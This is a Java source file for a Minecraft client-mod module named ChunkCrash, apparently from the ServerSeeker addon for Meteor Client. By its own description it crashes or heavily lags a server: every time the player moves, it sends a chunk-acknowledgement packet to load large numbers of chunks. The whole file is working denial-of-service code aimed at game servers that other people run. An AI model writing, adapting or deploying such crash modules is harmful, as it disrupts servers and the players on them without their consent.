package de.damcraft.serverseeker.modules.crash;

import de.damcraft.serverseeker.ServerSeeker;
import meteordevelopment.meteorclient.events.entity.player.PlayerMoveEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.AcknowledgeChunksC2SPacket;

public class ChunkCrash extends Module {
    public ChunkCrash() {
        super(ServerSeeker.C.CRASH, "ChunkCrash", "Crashes (makes huge lag) the server by loading lots of chunks.");
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent e) {
        var packet = new AcknowledgeChunksC2SPacket(34);
        ServerSeeker.mc.player.networkHandler.sendPacket(packet);
    }
}
